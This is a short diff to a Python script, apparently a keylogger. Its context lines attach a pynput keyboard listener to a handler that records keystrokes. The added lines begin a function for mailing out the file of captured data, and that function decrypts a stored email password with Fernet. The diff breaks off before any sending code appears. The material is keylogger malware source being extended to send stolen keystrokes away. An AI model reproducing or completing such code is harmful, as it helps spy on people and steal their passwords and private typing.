@@ -38,3 +38,13 @@ def grabarDatos(key):
 
 with Listener(on_press = grabarDatos) as l:
     l.join()
+
+def enviarMail(archivoConLosDatos):
+    def cargar_clave():
+        return  open('clave.encriptacion', 'rb').read()
+
+    key = cargar_clave()
+    clave = Fernet(key)
+    clave_encriptada = (open('clave.encriptada', 'rb').read())
+    password = clave.decrypt((clave_encriptada)).decode()
+
